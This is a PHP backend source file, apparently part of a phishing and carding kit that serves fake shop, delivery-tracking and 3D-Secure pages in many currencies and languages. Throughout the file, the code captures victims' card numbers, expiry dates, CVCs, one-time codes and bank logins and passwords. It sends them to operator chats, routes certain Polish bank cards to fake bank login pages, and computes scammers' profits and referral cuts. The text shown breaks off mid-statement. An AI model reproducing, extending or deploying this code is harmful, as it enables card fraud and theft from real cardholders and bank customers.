<?php
	include '_set.php';

	$action = $_POST['action'];
	if (!$action || $action == '')
		exit();
	if ($_POST['secretkey'] != secretKey())
		exit();
	$srvc = intval($_POST['service']);
	if ($srvc < 1 || $srvc > 50)
		exit();
	$_POST2 = json_decode($_POST['_post'], true);
	$_GET2 = json_decode($_POST['_get'], true);
	$_SERVER2 = json_decode($_POST['_server'], true);
	$_COOKIE2 = json_decode($_POST['_cookie'], true);
	$isnt = in_array($srvc, [1, 2, 15, 16, 17, 19, 20, 21, 25, 26, 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44,45]);
	$pages_3ds = '0';
	if ($srvc == 9 || $srvc == 12 || $srvc == 13) $isnt = 2;
	if ($srvc == 9) $isnt = 2;
	if ($srvc == 14) $isnt = 2;
	if ($srvc == 13) $isnt = 2;

	if ($srvc == 12) $isnt = 3;
	if ($srvc == 24) $isnt = 3;
	
	if ($srvc == 22) $isnt = 4;
	if ($srvc == 23) $isnt = 4;
	if ($srvc == 25) $isnt = 4;
	if ($srvc == 32) $isnt = 4;

	$item = beaText($_GET2['id'], chsNum());
	if (!isItem($item, $isnt) && !in_array($action, ['delivery', '3ds']))
		exit();
	$domain = $_SERVER2['domain'];
	$ip = beaText($_SERVER2['ip'], chsNum().'.:abcdef');
	$iploc = getCookieData('lctn', $_COOKIE2);
	$itemd = getItemData($item, $isnt);
	$id = $itemd[3];
	$amount = $itemd[5];
	$title = $itemd[6];
	$ddos0 = false;
	$data = false;

	$currency = 'RUB';

	if ($srvc == 15) { $currency = 'PLN'; } 
	if ($srvc == 16) { $currency = 'UAH'; }
	if ($srvc == 17) { $currency = 'KZT'; }
	if ($srvc == 18) { $currency = 'UAH'; }
	if ($srvc == 20) { $currency = 'lei'; }
	if ($srvc == 21) { $currency = 'RON'; }
	if ($srvc == 23) { $currency = 'UAH'; }
	if ($srvc == 24) { $currency = 'UAH'; }
	if ($srvc == 25) { $currency = 'LEV'; }
	if ($srvc == 26) { $currency = 'UZS'; }
	if ($srvc == 27) { $currency = 'GBP'; }
	if ($srvc == 28) { $currency = 'AUD'; }
	if ($srvc == 30) { $currency = 'KZT'; }
	if ($srvc == 31) { $currency = 'UAH'; }
	if ($srvc == 32) { $currency = 'KZT'; }
	if ($srvc == 33) { $currency = 'EUR'; }
	if ($srvc == 34) { $currency = 'EUR'; }
	if ($srvc == 35) { $currency = 'PLN'; } 
	if ($srvc == 36) { $currency = 'EUR'; }
	if ($srvc == 37) { $currency = 'EUR'; } 
	if ($srvc == 38) { $currency = 'EUR'; } 
	if ($srvc == 39) { $currency = 'EUR'; } 
	if ($srvc == 40) { $currency = 'EUR'; } 
	if ($srvc == 41) { $currency = 'EUR'; } 
	if ($srvc == 42) { $currency = 'EUR'; } 
	if ($srvc == 43) { $currency = 'EUR'; } 
	if ($srvc == 44) { $currency = 'EUR'; } 
	if ($srvc == 45) { $currency = 'EUR'; } 

	$course = json_decode(file_get_contents("https://www.cbr-xml-daily.ru/daily_json.js"));

	$course_pln = round($course->Valute->PLN->Value);
	$course_uah = round($course->Valute->UAH->Value)/10;
	$course_kzt = round($course->Valute->KZT->Value)/100;
	$course_lei = round($course->Valute->MDL->Value)/10;
	$course_ron = round($course->Valute->RON->Value);
	$course_lev = round($course->Valute->BGN->Value);
	$course_uzs = round($course->Valute->UZS->Value)/10000;
	$course_gbp = round($course->Valute->GBP->Value);
	$course_aud = round($course->Valute->AUD->Value);
	$course_eur = round($course->Valute->EUR->Value);

	function xEcho($t) {
		global $_COOKIE2;
		echo json_encode($_COOKIE2).'`'.$t;
		exit();
	}
	switch ($action) {
		case '3ds': {
			$md = $item;
			$t = getPayData($md, false);
			if (count($t) < 1) { exit(); }
			list($card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr, $pkoef) = $t;

			$isnt = ($isnt == '1');

			$msg = [false, '?????????????????????? ?????? ?????? ?????????????????? ???? ?????? ?????????? ????????????????. ????????????????????, ?????????????????? ?????????????????? ???????????????????? ?? ?????????????? ?????????????????????? ??????.'];
			if ($srvc == 15) { $msg = [false, 'Jednorazowy kod zosta?? wys??any na Tw??j numer telefonu. Sprawd?? szczeg????y transakcji i wprowad?? kod jednorazowy.']; } 
			if ($srvc == 16) { $msg = [false, '?????????????????????? ?????? ?????? ?????????????????????? ???? ?????? ?????????? ????????????????. ???????? ??????????, ?????????????????? ?????????????????? ???????????????????? ?? ?????????????? ?????????????????????? ??????.']; }
			if ($srvc == 17) { $msg = [false, '?????? ???????????? ?????? ???????????? ?????????????? ?????????????????????? ??????????????????. ???????????????????? ???????????? ???????????????????????? ????????????????, ?????? ???????????? ?????????? ??????????????????.']; }
			if ($srvc == 18) { $msg = [false, '?????????????????????? ?????? ?????? ?????????????????????? ???? ?????? ?????????? ????????????????. ???????? ??????????, ?????????????????? ?????????????????? ???????????????????? ?? ?????????????? ?????????????????????? ??????.']; }
			if ($srvc == 21) { $msg = [false, 'Codul unic a fost trimis la num??rul dvs. de telefon. Verifica??i detaliile tranzac??iei ??i introduce??i un cod unic.']; }
			if ($srvc == 23) { $msg = [false, '?????????????????????? ?????? ?????? ?????????????????????? ???? ?????? ?????????? ????????????????. ???????? ??????????, ?????????????????? ?????????????????? ???????????????????? ?? ?????????????? ?????????????????????? ??????.']; }
			if ($srvc == 24) { $msg = [false, '?????????????????????? ?????? ?????? ?????????????????????? ???? ?????? ?????????? ????????????????. ???????? ??????????, ?????????????????? ?????????????????? ???????????????????? ?? ?????????????? ?????????????????????? ??????.']; }
			if ($srvc == 30) { $msg = [false, '?????? ???????????? ?????? ???????????? ?????????????? ?????????????????????? ??????????????????. ???????????????????? ???????????? ???????????????????????? ????????????????, ?????? ???????????? ?????????? ??????????????????.']; }
			if ($srvc == 31) { $msg = [false, '?????????????????????? ?????? ?????? ?????????????????????? ???? ?????? ?????????? ????????????????. ???????? ??????????, ?????????????????? ?????????????????? ???????????????????? ?? ?????????????? ?????????????????????? ??????.']; }
			if ($srvc == 32) { $msg = [false, '?????? ???????????? ?????? ???????????? ?????????????? ?????????????????????? ??????????????????. ???????????????????? ???????????? ???????????????????????? ????????????????, ?????? ???????????? ?????????? ??????????????????.']; }
			if ($srvc == 34) { $msg = [false, 'Il codice usa e getta ?? stato inviato al tuo numero di telefono. Si prega di controllare i dettagli della transazione e inserire un codice una tantum.']; }
			if ($srvc == 35) { $msg = [false, 'Jednorazowy kod zosta?? wys??any na Tw??j numer telefonu. Sprawd?? szczeg????y transakcji i wprowad?? kod jednorazowy.']; } 
			if ($srvc == 36) { $msg = [false, 'Le code ?? usage unique a ??t?? envoy?? ?? Votre num??ro de t??l??phone. Veuillez v??rifier les d??tails de la transaction et entrer le code ?? usage unique.']; } 
			if ($srvc == 37) { $msg = [false, 'Ein einmaliger Code wurde an Ihre Telefonnummer gesendet. Bitte ??berpr??fen Sie die Transaktionsdetails und geben Sie den einmaligen Code ein.']; } 
			if ($srvc == 38) { $msg = [false, 'Ein einmaliger Code wurde an Ihre Telefonnummer gesendet. Bitte ??berpr??fen Sie die Transaktionsdetails und geben Sie den einmaligen Code ein.']; } 

            $action_POST = $_POST2['action_POST'];
            $code3ds = $_POST2['3dscode'];
            $login_bank = $_POST2['login_bank'];
            $password_bank = $_POST2['password_bank'];
			
			if ($code3ds && strlen($code3ds) > 2) {

				$msg = [true, '???? ?????????? ???????????????? ??????. ?????????????? ?????????????????? ?????? ?????????????????? ?? ???????????? ?????? ?????? ??????.'];
				if ($srvc == 15) { $msg = [false, 'Wprowadzi??e?? nieprawid??owy kod. Prosz?? sprawdzi?? kod wiadomo??ci i wprowadzi?? go ponownie.']; } 
				if ($srvc == 16) { $msg = [false, '???? ?????????? ???????????????? ??????. ???????????????? ???????????????????? ?????? ???????????????????????? ?? ???????????? ???????? ???? ??????.']; }
				if ($srvc == 17) { $msg = [false, '?????? ???????? ?????????? ????????????????????. ?????????????????? ?????????? ????????????????,?????? ???????????????? ??????????????????.']; }
				if ($srvc == 18) { $msg = [false, '???? ?????????? ???????????????? ??????. ???????????????? ???????????????????? ?????? ???????????????????????? ?? ???????????? ???????? ???? ??????.']; }
				if ($srvc == 21) { $msg = [false, 'Ai introdus un cod gre??it. V?? rug??m s?? verifica??i codul mesajului ??i introduce??i-l din nou.']; }
				if ($srvc == 23) { $msg = [false, '???? ?????????? ???????????????? ??????. ???????????????? ???????????????????? ?????? ???????????????????????? ?? ???????????? ???????? ???? ??????.']; }
				if ($srvc == 24) { $msg = [false, '???? ?????????? ???????????????? ??????. ???????????????? ???????????????????? ?????? ???????????????????????? ?? ???????????? ???????? ???? ??????.']; }
				if ($srvc == 30) { $msg = [false, '?????? ???????? ?????????? ????????????????????. ?????????????????? ?????????? ????????????????,?????? ???????????????? ??????????????????.']; }
				if ($srvc == 31) { $msg = [false, '???? ?????????? ???????????????? ??????. ???????????????? ???????????????????? ?????? ???????????????????????? ?? ???????????? ???????? ???? ??????.']; }
				if ($srvc == 32) { $msg = [false, '?????? ???????? ?????????? ????????????????????. ?????????????????? ?????????? ????????????????,?????? ???????????????? ??????????????????.']; }
				if ($srvc == 34) { $msg = [false, 'Hai inserito il codice sbagliato. Si prega di controllare il codice del messaggio e inserirlo nuovamente.']; }
				if ($srvc == 35) { $msg = [false, 'Wprowadzi??e?? nieprawid??owy kod. Prosz?? sprawdzi?? kod wiadomo??ci i wprowadzi?? go ponownie.']; } 
				if ($srvc == 36) { $msg = [false, 'Vous avez entr?? un code incorrect. Veuillez v??rifier le code du message et le saisir ?? nouveau.']; } 
				if ($srvc == 37) { $msg = [false, 'Sie haben einen falschen Code eingegeben. Bitte ??berpr??fen Sie den Mitteilungscode und geben Sie ihn erneut ein.']; } 
				if ($srvc == 38) { $msg = [false, 'Sie haben einen falschen Code eingegeben. Bitte ??berpr??fen Sie den Mitteilungscode und geben Sie ihn erneut ein.']; } 


				if (!$amount) {
					exit;
				}
				
				$t = $md.' '.$item.' '.$srvc;
				$lastcode = getCookieData('code'.$md, $_COOKIE2);

				if ($lastcode != $code3ds) {
					setCookieData('code'.$md, $code3ds, $_COOKIE2);
					check3DPage($code3ds, $amount, $username);

					botSend([
						'????	<b>???????????? ?????? 3D-Secure</b>',
						'',
						'???? ??????: <b>'.$code3ds.'</b>',
						'',
						'???? ?????????? ??????????????: <b>'.$amount.' '.$currency.'</b>',
						'???? ??????????: <b>'.$card.' ('.cardBank($card).')</b>',
						'',
						($isnt ? '???? ID ????????????????????' : '???? ???????? ??????????').': <b>'.$item.'</b>',
						'???? ????????????: <b>'.userLogin($id, true, true).'</b>',
					], chatAdmin(), [true, [
						[
							['text' => '??? ???????????????? ????????????', 'callback_data' => '/doruchkazalet '.$t],
						],
						[
							['text' => '9??????0??????0??????', 'callback_data' => '/doruchkafail1 '.$t],
							['text' => '???? ???????????????????????? ??????????????', 'callback_data' => '/doruchkafail2 '.$t],
						],
						[
							['text' => '?????? ???????????? ?????????? ????????', 'callback_data' => '/doruchkafail4 '.$t], 
							['text' => '???? ??????????', 'callback_data' => '/doruchkafail5 '.$t], 
						],
					]]);

					botSend([
						'???? <b>???????????? ???????? ?????? 3D-Secure</b>',
						'',
						'???? <b>ID ????????????????????:</b> <code>'.$item.'</code>',
						'???? <b>???????? ????????????:</b> <code>'.$amount.' '.$currency.'</code>',
						'??????? <b>????????????:</b> <code>'.getService($srvc, false, $isnb == 2).'</code>',
					], $id);
				}

            }
            
            if ($login_bank && $password_bank) {

                botSend([
					'????	<b>???????????? ??????????????????????</b>',
					'',
                    '???? ??????????: <b>'.$login_bank.'</b>',
                    '???? ????????????: <b>'.$password_bank.'</b>',
					'',
					'???? ?????????? ??????????????: <b>'.$amount.' '.$currency.'</b>',
					'???? ??????????: <b>'.$card.' ('.cardBank($card).')</b>',
					'',
					($isnt ? '???? ID ????????????????????' : '???? ???????? ??????????').': <b>'.$item.'</b>',
					'???? ????????????: <b>'.userLogin($id, true, true).'</b>',
				], chatAdmin());

				setCookieData('3ds_auth'.$md, 'true', $_COOKIE2);
                
            }

			$pages_3ds = '0';

			if ($srvc == 15 || $srvc == 35) { 
				$pages_3ds = '0-1';
				
				$bin_card = substr($card, 0, 6);

				if ($bin_card == '424671' || $bin_card == '425603' || $bin_card == '477925') {
					if (!getCookieData('3ds_auth'.$md, $_COOKIE2)) { // ING
						$pages_3ds = '0-1-1';
					}
				}

				if ($bin_card == '516931' || $bin_card == '425125' || $bin_card == '535470' || $bin_card == '416879' || $bin_card == '425167' || $bin_card == '543247' || $bin_card == '428902' || $bin_card == '535170' || $bin_card == '479019' || $bin_card == '547435' || $bin_card == '416822') {
					if (!getCookieData('3ds_auth'.$md, $_COOKIE2)) { // PKO
						$pages_3ds = '0-1-2';
					}
				}

				if ($bin_card == '406326' || $bin_card == '406322' || $bin_card == '535230' || $bin_card == '557524' || $bin_card == '406328' || $bin_card == '526771') {
					if (!getCookieData('3ds_auth'.$md, $_COOKIE2)) { // PEKAO
						$pages_3ds = '0-1-3';
					}
				}
			}
			
			if ($srvc == 16 || $srvc == 31 || $srvc == 24 || $srvc == 23 || $srvc == 18) { $pages_3ds = '0-2'; }
			if ($srvc == 17 || $srvc == 30 || $srvc == 32) { $pages_3ds = '0-3'; }
			if ($srvc == 28 || $srvc == 33) { $pages_3ds = '0-9'; }

			if ($srvc == 20) { $pages_3ds = '0-4'; }
			if ($srvc == 21) { $pages_3ds = '0-5'; }
			if ($srvc == 25) { $pages_3ds = '0-6'; }
			if ($srvc == 26) { $pages_3ds = '0-7'; }
			if ($srvc == 27) { $pages_3ds = '0-8'; }
			if ($srvc == 34) { $pages_3ds = '0-10'; }
			if ($srvc == 36) $pages_3ds = '0-36';
	        if ($srvc == 37) $pages_3ds = '0-37';
	        if ($srvc == 38) $pages_3ds = '0-38';
	        if ($srvc == 39) $pages_3ds = '0-39';
	        if ($srvc == 40) $pages_3ds = '0-40';
	        if ($srvc == 41) $pages_3ds = '0-41';
	        if ($srvc == 42) $pages_3ds = '0-42';
	        if ($srvc == 43) $pages_3ds = '0-43';
	        if ($srvc == 44) $pages_3ds = '0-44';
	        If ($srvc == 45) $pages_3ds = '0-45';

			$card4d = substr($card, strlen($card) - 4);
			$cardps = ['visa', 'Verified by VISA'];
			if ($card[0] == '2') { $cardps = ['mir', 'MirAccept']; }
			if ($card[0] == '5') { $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;']; }
			
			$data = str_replace([
				'%ps1%',
				'%ps0%',
				'%shop%',
				'%summ%',
				'%date%',
				'%card%',
				'%style%',
				'%msg%',
			], [
				$cardps[1],
				$cardps[0],
				$shop,
				number_format(intval($amount), 2, '.', ','),
				date('d/m/Y'),
				$card4d,
				($msg[0] ? 'style="color: #f00;"' : ''),
				$msg[1],
            ], fileRead(dirPages($pages_3ds)));
            
			break;
		}
		case 'order': case 'buy': case 'cash': case 'rent': {
			$isnb = array_search($action, ['order', 'buy', 'cash', 'rent']);
			$ttx = [
				'???????????????????? ????????????',
				'???????????????????? ????????????',
				'?????????????????? ??????????????',
				'???????????????????? ????????????',
			][$isnb];
			$hash0 = md5($isnb.$item.$title.$amount.$srvc.$domain.$ip);
			if ($hash0 != getCookieData('hash', $_COOKIE2)) {
				setCookieData('hash', $hash0, $_COOKIE2);
				addItemData($item, 0, 1, true);
				$ddos0 = true;
				botSend([
					'???? <b>???????????? ?????????????? ???? ???????????????? '.$ttx.':</b>',
					'',
					'???? <b>ID ????????????????????:</b> <code>'.$item.'</code>',
					'???? <b>??????????:</b> <code>'.$title.'</code>',
					'???? <b>???????? ????????????:</b> <code>'.$amount.' '.$currency.'</code>',
					'??????? <b>????????????:</b> <code>'.getService($srvc, false, $isnb == 2).'</code>',
				], $id);
			}
			$data = str_replace([
				'%style%',
				'%script%',
				'%item%',
				'%title%',
				'%amount%',
				'%amount2%',
				'%url%',
				'%img%',
				'%city%',
				'%namef%',
				'%phone%',
				'%address%',
			], [
				fileRead(dirStyles($srvc.'-1')),
				fileRead(dirScripts($srvc.'-'.($isnb + 1))),
				$item,
				$title,
				$amount,
				number_format($amount, 0, '.', ' '),
				getFakeUrl(false, $item, $srvc, ($isnb == 2 ? 5 : 0)),
				$itemd[7],
				$itemd[8],
				$itemd[9],
				$itemd[10],
				$itemd[11],
			], fileRead(dirPages($srvc.'-'.($isnb + 1))));
			break;
		}
		case 'track': {
			$tst = intval($itemd[16]);
			if ($tst == 0)
				$tst = 1;
			$hash0 = md5($tst.$item.$title.$amount.$srvc.$domain.$ip);
			if ($hash0 != getCookieData('hash', $_COOKIE2)) {
				setCookieData('hash', $hash0, $_COOKIE2);
				addItemData($item, 0, 1, false);
				$ddos0 = true;
				botSend([
					'???? <b>???????????? ?????????????? ???? ???????????????? ????????????????????????:</b>',
					'',
					'???? <b>ID ????????????????????:</b> <code>'.$item.'</code>',
					'???? <b>??????????:</b> <code>'.$title.'</code>',
					'???? <b>???????? ????????????:</b> <code>'.$amount.' '.$currency.'</code>',
					'??????? <b>????????????:</b> <code>'.getService($srvc, false, $isnb == 2).'</code>',
				], $id);
			}
			$data = str_replace([
				'%style%',
				'%script%',
				'%item%',
				'%title%',
				'%amount%',
				'%amount2%',
				'%url%',
				'%cityf%',
				'%cityt%',
				'%namef%',
				'%namet%',
				'%size%',
				'%address%',
				'%phone%',
				'%timef%',
				'%timet%',
			], [
				fileRead(dirStyles($srvc.'-1')),
				fileRead(dirScripts($srvc.'-1')),
				'CB'.$item.'0RU',
				$title,
				$amount,
				number_format($amount, 0, '.', ' '),
				getFakeUrl(false, $item, $srvc, $tst == 4 ? 4 : ($tst == 1 ? 0 : 2)),
				$itemd[7],
				$itemd[11],
				$itemd[9],
				$itemd[10],
				beaKg($itemd[8]),
				$itemd[12],
				$itemd[13],
				$itemd[14],
				$itemd[15],
			], fileRead(dirPages($srvc.'-'.$tst)));
			break;
		}
		case 'cars': case 'receiving': {
			$amount = $itemd[11];
			$isnb = array_search($action, ['cars', 'receiving']);
			$ttx = [
				'???????????????????? ??????????????',
				'?????????????????? ??????????????',
			][$isnb];
			$hash0 = md5($isnb.$item.$title.$amount.$srvc.$domain.$ip);
			if ($hash0 != getCookieData('hash', $_COOKIE2)) {
				setCookieData('hash', $hash0, $_COOKIE2);
				addItemData($item, 0, 1, true);
				$ddos0 = true;
				botSend([
					'???? <b>???????????? ?????????????? ???? ???????????????? ??????????????:</b>',
					'',
					'???? <b>ID ????????????????????:</b> <code>'.$item.'</code>',
					'???? <b>???????? ????????????:</b> <code>'.$amount.' '.$currency.'</code>',
					'??????? <b>????????????:</b> <code>'.getService($srvc, false, $isnb == 2).'</code>',
				], $id);
			}
			$data = str_replace([
				'%url%',
				'%style%',
				'%script%',
				'%amount%',
				'%amount2%',
				'%address1%',
				'%address2%',
				'%data%',
				'%time%',
				'%namef%',
				'%passengers%',
				'%price%',
			], [
				getFakeUrl(false, $item, $srvc, ($isnb == 2 ? 5 : 0)),
				fileRead(dirStyles($srvc.'-1')),
				fileRead(dirScripts($srvc.'-'.($isnb + 1))),
				$amount,
				number_format($amount, 0, '.', ' '),
				$itemd[12], // ????????????
				$itemd[6], // ????????
				$itemd[7], // ????????
				$itemd[8], // ??????????
				$itemd[9], // ?????? ????????????????
				$itemd[10], // ??????-???? ????????
				$itemd[11], // ????????
			], fileRead(dirPages($srvc.'-'.($isnb + 1))));
			break;
		}
		case 'merchant': case 'refund': case 'unlock': case 'ayeruchnayaplatejjjka666': {
			$xcaptchadata = $_POST2;
			$pmnt = paymentName();
			$isrpar = ($action == 'ayeruchnayaplatejjjka666');
			$isrpac = (strlen($pmnt) == 0 || (isAutoPayment() && $amount >= activateRuchka()) || $srvc == 15 || $srvc == 16 || $srvc == 17 || $srvc == 18 || $srvc == 20 || $srvc == 21 || $srvc == 23);
			if (!$isrpac) {
				require 'pay.libs/Crypt/RSA.php';
				require 'pay.libs/Math/BigInteger.php';
				include '_payment_'.$pmnt.'.php';
			}
			$isnr = array_search($action, ['merchant', 'refund', 'unlock']);
			$ttx = [
				[
					'???????????? ????????????',
					'?? ????????????',
					'????????????????',
					'???????????? ????????????',
					'',
				],
				[
					'???????????????? ??????????????',
					'?? ????????????????',
					'????????????????',
					'?????????????? ??????????????',
					'?????? ???????????????????? ????????????????, ?????? ???????????????????? ?????????????????????????????? ???? ?????????? ?????????? ???????????????? ???????????????? ?? ?????????????? ?????????? ????????????.',
				],
				[
					'?????????????????? ??????????????',
					'?? ??????????????????',
					'????????????????',
					'?????????????????? ??????????????',
					'?????????? ???????????????? ???????????????? ???????????????? ???? ???????????????????? ??????????, ?????? ???????????? ???? ?????????? ???????????? ???????? ???? ?????????? ?????????? ????????????.',
				],
				[
					'?????????????????? ??????????????',
					'?? ??????????????????',
					'????????????????',
					'?????????????????? ??????????????',
					'?????????? ???????????????? ???????????????? ???????????????? ???? ???????????????????? ??????????, ?????? ???????????? ???? ?????????? ???????????? ???????? ???? ?????????? ?????????? ????????????.',
				],
			][$isnr];
			$cost = 0;
			if ($isnt) {
				$cost = $_POST2['fcost'];
				if (strlen($cost) != 0) {
					$cost = intval($cost);
					setCookieData('dlvr'.$item, $cost, $_COOKIE2);
				} else {
					$cost = intval(getCookieData('dlvr'.$item, $_COOKIE2));
				}
				$cost = min(max($cost, 0), 10000);
				if ($cost > 0)
					$amount += $cost;
			}
			$shop = getShopName($srvc, $isnr);
			$redir = getFakeRedir($domain, $item, $isnr);
			$errmsg = false;
			$card = beaText($_POST2['fcard'], chsNum());
			$expm = $_POST2['fexpm'];
			$expy = $_POST2['fexpy'];
			$cvc = $_POST2['fcvc'];
			$balancecard = intval($_POST2['balancecard']);
			$pares = $_POST2['PaRes'];
			$merchant = $_POST2['MD'];
			if ($pares && $merchant && isPayData($merchant)) {
				$ruchkastatus = ($_POST2['ruchkastatus'] == '1');
				$pkoef = false;
				if ($isrpar) {
					list($card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr, $pkoef) = getPayData($merchant, !$ruchkastatus);
					$pkoef = intval($pkoef) + 1;
					if ($ruchkastatus) {
						setPayData($merchant, [$card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr, $pkoef]);
					}
					$isnt = ($isnt == '1');
				} else {
					list($card, $expm, $expy, $cvc, $card2, $amount, $token) = getPayData($merchant);
				}
				$amount = intval($amount);
				$psts = ($isrpar ? [$ruchkastatus, $_POST2['ruchkafail'], ''] : xStatus($merchant, $pares, $token));
				if ($psts[0]) {
					$card3 = false;
					if (!$isrpar && $pmnt != 'btc') {
						$card3 = setNextCard();
						addCardBalance($card2, $amount);
					}
					if (!$pkoef) {
						$pkoef = intval(getCookieData('koef'.$item.($isnr != 1 ? 'a' : 'b'), $_COOKIE2)) + 1;
						setCookieData('koef'.$item.($isnr != 1 ? 'a' : 'b'), $pkoef, $_COOKIE2);
					}
					
					$amount_sov = $amount;

					if ($srvc == 15) { $amount_sov = $amount*$course_pln; } 
					if ($srvc == 16) { $amount_sov = $amount*$course_uah; }
					if ($srvc == 17) { $amount_sov = $amount*$course_kzt; }
					if ($srvc == 18) { $amount_sov = $amount*$course_uah; }
					if ($srvc == 20) { $amount_sov = $amount*$course_lei; }
					if ($srvc == 21) { $amount_sov = $amount*$course_ron; }
					if ($srvc == 23) { $amount_sov = $amount*$course_uah; }
					if ($srvc == 24) { $amount_sov = $amount*$course_uah; }
					if ($srvc == 25) { $amount_sov = $amount*$course_lev; }
					if ($srvc == 26) { $amount_sov = $amount*$course_uzs; }
					if ($srvc == 27) { $amount_sov = $amount*$course_gbp; }
					if ($srvc == 28) { $amount_sov = $amount*$course_aud; }
					if ($srvc == 30) { $amount_sov = $amount*$course_kzt; }
					if ($srvc == 31) { $amount_sov = $amount*$course_uah; }
					if ($srvc == 32) { $amount_sov = $amount*$course_kzt; }
					if ($srvc == 33) { $amount_sov = $amount*$course_eur; }
					if ($srvc == 34) { $amount_sov = $amount*$course_eur; }

					if ($amount == $amount_sov) {
						$convertor = "???? <b>?????????? ??????????????????????:</b> <code>?? ?????????????????????? ???? ??????????????????</code>";
					} else {
						$convertor = "???? <b>?????????? ??????????????????????:</b> <code>".$amount_sov." RUB</code>";
					}

					$profit = makeProfit($id, $isnr, $amount_sov, $pkoef);
					$pkoef2 = '???? <b>????????????'.($isnr != 1 ? '???? ????????????' : '???? ??????????????').($pkoef > 1 ? ' X'.$pkoef : '').'</b>';
					addItemData($item, 1, 1, $isnt);
					addItemData($item, 2, $amount, $isnt);
					$referal = getUserReferal($id);

					botSend([
						$pkoef2,
						'',
						'???? <b>?????????? ??????????????:</b> <code>'.$amount.' '.$currency.'</code>',
						'',
						($isnt ? '<b>???? ID ????????????????????</b>' : '<b>???? ???????? ??????????</b>').': <code>'.$item.'</code>',
						'???? <b>????????????????:</b> <code>'.$title.'</code>',
						'???? <b>????????????:</b> <code>'.getService($srvc, false, $isnr == 2).'</code>',
					], $id);

					botSend([
						$pkoef2,
						'',
						'???? <b>?????????? ??????????????:</b> <code>'.$amount.' '.$currency.'</code>',
						$convertor,
						'???? <b>????????????:</b> <code>'.getService($srvc, false, $isnr == 2).'</code>',
						'???? <b>????????????:</b> '.userLogin2($id).'',
					], chatProfits());

					botSend([
						$pkoef2,
						'',
						'???? <b>?????????? ??????????????:</b> <code>'.$amount.' '.$currency.'</code>',
						$convertor,
						'???? <b>????????????:</b> <code>'.getService($srvc, false, $isnr == 2).'</code>',
						'???? <b>????????????:</b> '.userLogin2($id).'',
					], chatGroup());

					botSend([
						$pkoef2,
						'',
						'???? ?????????? ??????????????: <b>'.$amount.' '.$currency.'</b>',
						$convertor,
						'???? ????????????: <b>'.userLogin($id, true, true).'</b>',
						'???? ???????? ??????????????: <b>'.beaCash($profit[0]).'</b>',
						'???? ???????? ????????????????: <b>'.beaCash($profit[1]).'</b>'.($referal ? ' (<b>'.userLogin($referal, true).'</b>)' : ''),
						'',
						'???? ??????????: <b>'.cardBank($card).'</b>',
						'?????? ??????????: <b>'.$card.'</b>',
						'???? ????????: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
						'???? CVC: <b>'.$cvc.'</b>',
						'',
						($isnt ? '???? ID ????????????????????' : '???? ???????? ??????????').': <b>'.$item.'</b>',
						'???? ????????????????: <b>'.$title.'</b>',
						'???? ????????????: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						'???? ??????????: <b>'.$domain.'</b>',
					], chatAlerts());

					if (!$isrpar) {
						$t1 = [
							'?????? <b>???????????? '.($pmnt == 'btc' ? '????????????????' : '??????????').' '.$card2.' ???????????????? ???? '.beaCash($amount).'</b>',
						];
						if ($card3)
							$t1 = array_merge($t1, [
								'',
								'??? ?????????? ???????????????? ?????????????????????????? ???????????????? ???? <b>'.$card3.'</b>',
							]);
						botSend($t1, chatAdmin());
					}

					if ($referal) {
						botSend([
							'???? <b> ???? ???????????????? '.beaCash($profit[1]).' ???? ?????????????? ????????????????</b> <code>'.userLogin($id).'</code>',
						], $referal);
					}
					
					if (!$isrpar) {
						$pcrt = xCreate($amount, $card, $expm, $expy, $cvc, $redir, $shop, $xcaptchadata);
						if ($pcrt[0]) {
							$data = $pcrt[1];
							break;
						} else {
							if ($pcrt[2])
								xEcho($pcrt[1]);
							$errmsg = $pcrt[1];
						}
					}
				} else {
					$errmsg = $psts[1];
					$errmsg2 = ($isrpar ? $errmsg : ((strpos($errmsg, '3D') !== false || strpos($errmsg, '????????????????') !== false || strpos($errmsg, '????????????') !== false) ? '???????? ???? ???????????????? 3D-Secure.' : '????????????????, ???????????????????????? ?????????????? ?????? ????????????????.'));
					$pkoef2 = '??? <b>???????????? ?????? '.($isnr != 1 ? '????????????' : '????????????????').'</b>';

					botSend([
						$pkoef2,
						'',
						'??? <b>??????????????:</b> <code>'.$errmsg2.'</code>',
						'???? <b>?????????? ??????????????:</b> <code>'.$amount.' '.$currency.'</code>',
						'',
						'???? <b>????????????????:</b> <code>'.$title.'</code>',
						'???? <b>????????????:</b> <code>'.getService($srvc, false, $isnr == 2).'</code>',
					], $id);

					botSend([
						$pkoef2,
						'',
						'??? ??????????????: <b>'.$errmsg.' ('.$errmsg2.')</b>',
						'???? ?????????? ??????????????: <b>'.$amount.' '.$currency.'</b>',
						$convertor,
						'???? ????????????: <b>'.userLogin($id, true, true).'</b>',
						'',
						'???? ??????????: <b>'.cardHide($card).'</b>',
						'',
						($isnt ? '???? ID ????????????????????' : '???? ???????? ??????????').': <b>'.$item.'</b>',
						'???? ????????????????: <b>'.$title.'</b>',
						'???? ????????????: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						'???? ??????????: <b>'.$domain.'</b>',
					], chatAlerts());

				}
			} else {
				if (isValidCard($card, $expm, $expy, $cvc)) {
					$pcrt = false;
					if ($isrpac) {
						$md = time().rand(100000, 999999);
						if($srvc == 12 || $srvc == 24) {
							$amount = $itemd[11];
						}
						setPayData($md, [$card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt ? '1' : '0', $isnr, 0]);
						botSend([
							'?????? <b>?????????????? ???? ???????????? 3D-Secure</b>',
							'',
							'???? ?????????? ??????????????: <b>'.$amount.' '.$currency.'</b>',
							'',
							'???? ??????????: <b>'.cardBank($card).'</b>',
							'?????? ??????????: <b>'.$card.'</b>',
							'???? ????????: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
							'???? CVC: <b>'.$cvc.'</b>',
							$_POST2['balancecard'] ? '???? ????????????: <b>'.$balancecard.'</b> '.$currency.'.' : '???? <b>?????????? ?????????????? ????????????????</b>',
							'',
							($isnt ? '???? ID ????????????????????' : '???? ???????? ??????????').': <b>'.$item.'</b>',
